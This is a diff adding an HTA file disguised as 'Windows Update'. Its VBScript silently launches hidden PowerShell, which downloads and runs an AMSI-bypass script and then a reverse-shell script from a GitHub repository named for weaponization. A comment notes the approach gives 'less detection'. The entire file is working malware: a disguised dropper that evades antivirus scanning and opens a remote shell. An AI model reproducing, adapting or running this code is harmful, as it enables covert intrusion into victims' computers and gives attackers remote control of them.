@@ -1,0 +1,22 @@
+<html>
+<head>
+<HTA:APPLICATION ID="Clean" APPLICATIONNAME="Windows Update" SCROLL="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize">
+</head>
+
+<script language="VBScript">
+Set o = CreateObject("Wscript.Shell")
+
+' Simple direct approach - less detection
+command = "powershell -WindowStyle Hidden -Command """
+command = command & "try {"
+command = command & "Invoke-WebRequest 'https://raw.githubusercontent.com/mostafa587/Resource-development-weaponization/main/Power-Shell%20Based%20Attack/2amsi-bypass.ps1' -UseBasicParsing | Invoke-Expression; "
+command = command & "Start-Sleep -Seconds 2; "
+command = command & "Invoke-WebRequest 'https://raw.githubusercontent.com/mostafa587/Resource-development-weaponization/main/Power-Shell%20Based%20Attack/reverse-shell.ps1' -UseBasicParsing | Invoke-Expression"
+command = command & "} catch {}""" 
+
+o.Run command, 0, False
+Window.Close
+</script>
+<body>
+</body>
+</html>
